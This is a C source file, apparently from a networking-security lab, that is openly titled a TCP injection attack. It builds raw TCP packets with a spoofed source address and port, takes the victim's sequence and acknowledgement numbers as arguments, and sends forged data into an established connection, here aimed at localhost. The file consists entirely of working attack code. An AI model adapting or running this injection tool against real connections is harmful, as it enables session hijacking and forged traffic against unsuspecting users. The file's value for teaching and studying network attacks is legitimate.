// Attack 3: TCP Injection Attack
// Created by calvinlau on 16/11/18.
//

#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include<arpa/inet.h>
#include<unistd.h>

#define SPOOF_PORT 31228 // spoofed port is server's port
#define SPOOF_IPADDR "127.0.0.1" // spoofed IP address is server's IP address
#define DEST_IPADDR "127.0.0.1" // destination IP address is client's IP address
//#define DEST_PORT 39922 // destination port is client's port
//#define SPOOF_ACK 679314048
//#define SPOOF_SEQ SPOOF_ACK + 1

struct pseudo_header
// Used for TCP checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
// IP checksum calculation
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

unsigned short in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

int main (int argc, char *argv[]) {
    char *p;
    long DEST_PORT = strtol(argv[1], &p, 10);
    long SPOOF_ACK = strtol(argv[2], &p, 10);
    long SPOOF_SEQ = strtol(argv[3], &p, 10);
    // Create raw socket_fd
    int socket_fd;
    if ((socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        printf("~~~socket() error: %d\n", socket_fd);
    } else {
        printf("~~~socket() success: %d\n", socket_fd);
    }

    // Datagram to represent the packet
    char datagram[4096], source_ip[32];
    // IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in dest_addr;
    struct pseudo_header psh;

    // Fake reply payload
    unsigned char payload[] = "Hello, worl";
    unsigned short payload_len = strlen(payload);

    strcpy(source_ip, SPOOF_IPADDR);

    dest_addr.sin_family = AF_INET;
//    dest_addr.sin_port = htons(DEST_PORT);
    dest_addr.sin_addr.s_addr = inet_addr(DEST_IPADDR);

    memset (datagram, 0, 4096);

    // Fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(payload);
    iph->id = htons(12830);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("127.0.0.1");	// Source address spoofed to arbitrary IP address
    iph->daddr = inet_addr("127.0.0.1");
//    iph->check = in_cksum((unsigned short *)&iph, sizeof(iph));

    //TCP Header
    tcph->source = htons(SPOOF_PORT);
    tcph->dest = htons(DEST_PORT);
    tcph->seq = htonl(SPOOF_SEQ); // SEQ must = ACK from client in three-way handshake ACK packet
    tcph->ack_seq = htonl(SPOOF_ACK); // ACK_SEQ must = SEQ sent from client in three-way handshake ACK packet
    tcph->doff = sizeof(struct tcphdr) / 4; // Offset to length of TCP header (without flags it is 5)
    tcph->fin=0;
    tcph->syn= 0;
    tcph->rst=0;
    tcph->psh=1;    // Set TCP PSH flag to inform TCP to send data immediately
    tcph->ack= 1;
    tcph->urg=0;
    tcph->urg_ptr = 0;
    tcph->window = htons(32768);	// Max window size
    tcph->th_sum = 0;   // Set TCP checksum to 0 -> offload checksum calculation to kernel

    // Fill in pseudo header
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = dest_addr.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->th_sum = in_cksum((unsigned short *)&psh, 12 + sizeof(tcph));

    memcpy((datagram + sizeof(struct iphdr) + sizeof(struct tcphdr)), payload, payload_len * sizeof(uint8_t));

    // Inform kernel that IP headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }

    // Send packet using sendto()
    ssize_t bytes_sent = sendto(socket_fd,	// Raw socket file descriptor
                                datagram,	// Raw packet
                                iph->tot_len,	// Length of raw packet
                                0, // Routing flags
                                (struct sockaddr *) &dest_addr,	// Socket destination address
                                sizeof (dest_addr)); // Size of socket destination address
    if (bytes_sent < 0) // Catch sendto() errors
    {
        printf ("~~~error: %ld\n", bytes_sent);
    }
    else // Raw packet successfully sent
    {
        printf ("~~~Packet sent to destination IP address %s and destination port %ld. Bytes sent: %ld\n", DEST_IPADDR, DEST_PORT, bytes_sent);
    }
    close(socket_fd);
}
